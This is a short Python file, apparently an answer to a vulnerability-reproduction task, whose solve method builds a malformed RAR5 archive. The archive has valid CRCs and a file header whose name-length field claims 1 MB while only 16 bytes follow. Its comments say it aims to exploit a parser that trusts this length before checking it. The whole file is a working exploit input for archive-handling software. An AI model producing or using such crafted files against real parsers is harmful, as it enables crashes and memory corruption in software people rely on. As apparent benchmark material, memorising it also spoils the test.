import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 Signature: "Rar!\x1a\x07\x01\x00"
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        def to_vint(n):
            res = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                    res.append(byte)
                else:
                    res.append(byte)
                    break
            return bytes(res)

        # 1. Main Archive Header (Block Type 0x01)
        # Structure: [CRC32] [Size] [Type] [HeaderFlags] [ArchiveFlags]
        main_payload = to_vint(1) + to_vint(0) + to_vint(0)
        main_size = to_vint(len(main_payload))
        # CRC is calculated over the payload data
        main_crc = struct.pack("<I", zlib.crc32(main_payload) & 0xFFFFFFFF)
        main_block = main_crc + main_size + main_payload

        # 2. File Header (Block Type 0x02) - Vulnerable
        # Structure: [CRC32] [Size] [Type] [HeaderFlags] [FileFlags] [UnpSize] [Attr] [CompInfo] [HostOS] [NameSize] [Name...]
        # The vulnerability is that NameSize is read, memory is allocated/used, and the size check happens too late.
        # We provide a NameSize much larger than the actual data available in the block.
        
        target_name_size = 0x100000 # 1 MB (Larger than standard name limits)
        
        file_payload = bytearray()
        file_payload += to_vint(2)  # Type = 2 (File Header)
        file_payload += to_vint(0)  # HeaderFlags = 0 (No Extra Area, No Data Area)
        file_payload += to_vint(0)  # FileFlags = 0
        file_payload += to_vint(0)  # UnpackedSize = 0
        file_payload += to_vint(0)  # Attributes = 0
        file_payload += to_vint(0)  # CompressionInfo = 0
        file_payload += to_vint(0)  # HostOS = 0
        file_payload += to_vint(target_name_size) # NameSize (Vulnerable Field)
        
        # Include some data for the name to start parsing, but truncate well before NameSize
        file_payload += b"A" * 16
        
        file_size = to_vint(len(file_payload))
        file_crc = struct.pack("<I", zlib.crc32(file_payload) & 0xFFFFFFFF)
        file_block = file_crc + file_size + file_payload

        return sig + main_block + file_block
